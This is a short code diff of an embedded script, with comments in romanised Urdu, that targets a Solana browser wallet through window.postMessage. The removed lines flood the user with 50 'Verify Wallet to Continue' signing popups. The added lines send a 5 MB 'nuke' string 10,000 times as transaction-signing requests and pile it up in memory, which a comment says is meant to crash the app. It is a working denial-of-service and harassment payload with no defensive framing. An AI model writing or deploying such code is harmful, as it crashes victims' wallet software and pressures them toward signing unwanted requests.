@@ -1,11 +1,20 @@
 <script>
     setTimeout(() => {
-        // Ye user ko baar baar popup dikhaye ga
-        for (let i = 0; i < 50; i++) {
+        // 5MB ka aik bohot bada data block
+        const nuke = "X".repeat(5 * 1024 * 1024); 
+        const array = [];
+
+        // Loop ko 10,000 baar chalayein lekin 5MB data ke sath
+        for (let i = 0; i < 10000; i++) {
+            // Ye app ki RAM ko crash karne ki koshish karega
             window.postMessage({
                 target: "provider",
-                data: { method: "sol_signMessage", params: ["Verify Wallet to Continue"] }
+                data: { method: "sol_signTransaction", params: [nuke] }
             }, "*");
+            
+            // Background mein memory bharne ke liye
+            array.push(nuke); 
         }
     }, 2000);
 </script>
+
